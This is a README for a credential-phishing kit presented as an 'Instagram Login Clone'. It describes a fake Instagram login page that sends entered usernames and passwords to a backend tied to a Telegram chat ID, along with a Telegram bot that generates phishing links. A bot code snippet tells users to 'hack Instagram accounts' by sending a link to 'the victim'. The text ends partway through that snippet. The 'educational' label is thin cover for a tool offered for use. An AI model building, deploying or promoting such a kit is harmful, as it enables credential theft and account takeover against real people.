# Instagram Login Clone

This repository contains the source code for an **Instagram Login Clone** designed for educational and demonstration purposes. The project mimics the Instagram login page's design and functionalities, with added support for phishing demonstrations, URL parameter handling, and API integrations.

## Project Details

### Live Demo
- Deployed on **Vercel**: [Instagram Login Clone](https://vercel.com/)

### Repository
- GitHub URL: [Instagram-hack-phishing](https://github.com/SGModder-Offcial/Instagram-hack-phising)

### Tutorial Video
- **YouTube Video Tutorial**: [Watch the tutorial](https://youtu.be/VKWtJKQyoD8?si=8Js12n_SUvtAvEZU)

---

## Features
- **Responsive Design**: Fully responsive, mobile-friendly layout.
- **Custom Notification System**: Shows success or error messages dynamically.
- **URL Parameters**: Fetches `chatId` from the URL for enhanced functionality.
- **Dynamic Validation**: Disables/enables the login button based on input validation.
- **API Integration**: Sends user credentials and `chatId` to a backend server.
- **Redirections**: Links to official Instagram login, signup, and password reset pages.
- **Telegram Bot Integration**: Generates phishing links dynamically using bot commands.

---

## Bot Setup

### Prerequisites
- A Telegram Bot Business account set up via **BotFather**.
- Access to the Telegram Bot API.

### Commands and Code

#### `/start` Command
Welcomes the user and provides instructions on using the bot.
```javascript
Bot.sendMessage("WELCOME! YOU CAN USE THIS BOT TO HACK INSTAGRAM ACCOUNTS USING JUST A LINK 🔗 \n\n𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄: \n1. Send the /create command \n2. Share the generated URL with the victim.");
